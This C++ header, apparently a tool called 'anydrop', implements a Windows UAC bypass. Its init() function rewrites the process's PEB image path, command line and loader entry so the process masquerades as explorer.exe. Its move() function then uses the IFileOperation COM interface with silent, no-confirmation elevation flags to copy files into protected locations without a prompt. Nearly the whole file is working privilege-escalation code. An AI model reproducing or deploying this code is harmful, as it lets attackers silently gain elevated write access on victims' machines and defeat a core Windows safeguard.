#pragma once
#include <Windows.h>
#include <iostream>
#include <shobjidl.h>

namespace anydrop
{
	// functions
	BOOL init()
	{
		// definitions
		typedef struct _UNICODE_STRING { USHORT length; USHORT maximum_length; PWSTR buffer; } UNICODE_STRING, * PUNICODE_STRING;
		typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(HANDLE process_handle, DWORD process_information_class, PVOID process_information, DWORD process_information_length, PDWORD return_length);
		typedef NTSTATUS(NTAPI* _RtlEnterCriticalSection)(PRTL_CRITICAL_SECTION critical_section);
		typedef NTSTATUS(NTAPI* _RtlLeaveCriticalSection)(PRTL_CRITICAL_SECTION critical_section);
		typedef void (WINAPI* _RtlInitUnicodeString)(PUNICODE_STRING destination_string, PCWSTR source_string);
		typedef struct _LIST_ENTRY { struct _LIST_ENTRY* flink; struct _LIST_ENTRY* blink; } LIST_ENTRY, * PLIST_ENTRY;
		typedef struct _PROCESS_BASIC_INFORMATION { LONG exit_status; PVOID peb_base_address; ULONG_PTR affinity_mask; LONG base_priority; ULONG_PTR unique_process_id; ULONG_PTR parent_process_id; } PROCESS_BASIC_INFORMATION, * PPROCESS_BASIC_INFORMATION;
		typedef struct _PEB_LDR_DATA { ULONG length; BOOLEAN initialized; HANDLE ss_handle; LIST_ENTRY in_load_order_module_list; LIST_ENTRY in_memory_order_module_list; LIST_ENTRY in_initialization_order_module_list; PVOID entry_in_progress; BOOLEAN shutdown_in_progress; HANDLE shutdown_thread_id; } PEB_LDR_DATA, * PPEB_LDR_DATA;
		typedef struct _RTL_USER_PROCESS_PARAMETERS { BYTE reserved1[16]; PVOID reserved2[10]; UNICODE_STRING image_path_name; UNICODE_STRING command_line; } RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;
		typedef struct _PEB { BOOLEAN inherited_address_space; BOOLEAN read_image_file_exec_options; BOOLEAN being_debugged; union { BOOLEAN bit_field; struct { BOOLEAN image_uses_large_pages : 1; BOOLEAN is_protected_process : 1; BOOLEAN is_legacy_process : 1; BOOLEAN is_image_dynamically_relocated : 1; BOOLEAN skip_patching_user32_forwarders : 1; BOOLEAN spare_bits : 3; }; }; HANDLE mutant; PVOID image_base_address; PPEB_LDR_DATA ldr; PRTL_USER_PROCESS_PARAMETERS process_parameters; PVOID subsystem_data; PVOID process_heap; PRTL_CRITICAL_SECTION fast_peb_lock; } PEB, * PPEB;
		typedef struct _LDR_DATA_TABLE_ENTRY { LIST_ENTRY in_load_order_links; LIST_ENTRY in_memory_order_links; union { LIST_ENTRY in_initialization_order_links; LIST_ENTRY in_progress_links; }; PVOID dll_base; PVOID entry_point; ULONG size_of_image; UNICODE_STRING full_dll_name; UNICODE_STRING base_dll_name; ULONG flags; WORD load_count; WORD tls_index; union { LIST_ENTRY hash_links; struct { PVOID section_pointer; ULONG check_sum; }; }; union { ULONG time_date_stamp; PVOID loaded_imports; }; } LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;


		PPEB peb;
		PPEB_LDR_DATA pld;
		PLDR_DATA_TABLE_ENTRY ldte;

		HMODULE h_module = GetModuleHandleW(L"ntdll.dll");
		_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(h_module, "RtlInitUnicodeString");
		_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(h_module, "NtQueryInformationProcess");
		_RtlEnterCriticalSection RtlEnterCriticalSection = (_RtlEnterCriticalSection)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlEnterCriticalSection");
		_RtlLeaveCriticalSection RtlLeaveCriticalSection = (_RtlLeaveCriticalSection)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlLeaveCriticalSection");

		HANDLE h_process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, GetCurrentProcessId());
		if (h_process == INVALID_HANDLE_VALUE) {
			return FALSE;
		}

		PROCESS_BASIC_INFORMATION pbi;
		NtQueryInformationProcess(h_process, 0, &pbi, sizeof(pbi), NULL);

		if (!ReadProcessMemory(h_process, &pbi.peb_base_address, &peb, sizeof(peb), NULL)) {
			return FALSE;
		}

		if (!ReadProcessMemory(h_process, &peb->ldr, &pld, sizeof(pld), NULL)) {
			return FALSE;
		}

		WCHAR explorer_path[MAX_PATH + 1];
		GetWindowsDirectory(explorer_path, MAX_PATH);
		wcscat_s(explorer_path, sizeof(explorer_path) / sizeof(wchar_t), L"\\explorer.exe");

		LPWSTR pw_explorer = (LPWSTR)malloc(MAX_PATH);
		wcscpy_s(pw_explorer, MAX_PATH, explorer_path);

		RtlEnterCriticalSection(peb->fast_peb_lock);

		RtlInitUnicodeString(&peb->process_parameters->image_path_name, pw_explorer);
		RtlInitUnicodeString(&peb->process_parameters->command_line, pw_explorer);

		WCHAR w_full_dll_name[MAX_PATH];
		WCHAR w_exe_file_name[MAX_PATH];
		GetModuleFileName(NULL, w_exe_file_name, MAX_PATH);

		LPVOID p_start_module_info = peb->ldr->in_load_order_module_list.flink;
		LPVOID p_next_module_info = pld->in_load_order_module_list.flink;
		do
		{
			if (!ReadProcessMemory(h_process, &p_next_module_info, &ldte, sizeof(ldte), NULL)) {
				return FALSE;
			}

			if (!ReadProcessMemory(h_process, (LPVOID)ldte->full_dll_name.buffer, (LPVOID)&w_full_dll_name, ldte->full_dll_name.maximum_length, NULL)) {
				return FALSE;
			}

			if (_wcsicmp(w_exe_file_name, w_full_dll_name) == 0) {
				RtlInitUnicodeString(&ldte->full_dll_name, pw_explorer);
				RtlInitUnicodeString(&ldte->base_dll_name, pw_explorer);
				break;
			}

			p_next_module_info = ldte->in_load_order_links.flink;

		} while (p_next_module_info != p_start_module_info);

		CloseHandle(h_process);
		RtlLeaveCriticalSection(peb->fast_peb_lock);

		return !(wcsicmp(explorer_path, w_full_dll_name) == 0);
	}

	HRESULT move(LPCWSTR src_path, LPCWSTR dest_path)
	{
		IFileOperation* file_operation = NULL;
		IShellItem* from = NULL;
		IShellItem* to = NULL;

		HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
		if (FAILED(hr))
			return hr;

		hr = CoCreateInstance(CLSID_FileOperation, NULL, CLSCTX_ALL, IID_PPV_ARGS(&file_operation));
		hr = file_operation->SetOperationFlags(FOF_NOCONFIRMATION | FOF_SILENT | FOFX_SHOWELEVATIONPROMPT | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION | FOF_NOERRORUI);
		hr = SHCreateItemFromParsingName(src_path, NULL, IID_PPV_ARGS(&from));
		hr = SHCreateItemFromParsingName(dest_path, NULL, IID_PPV_ARGS(&to));
		LPCWSTR filename = &src_path[wcslen(src_path) - 1];
		while (filename > src_path && *(filename - 1) != '\\') {
			filename--;
		}

		hr = file_operation->CopyItem(from, to, filename, NULL);
		if (SUCCEEDED(hr))
		{
			hr = file_operation->PerformOperations();
		}

		to->Release();
		from->Release();
		file_operation->Release();
		CoUninitialize();

		return hr;
	}

}
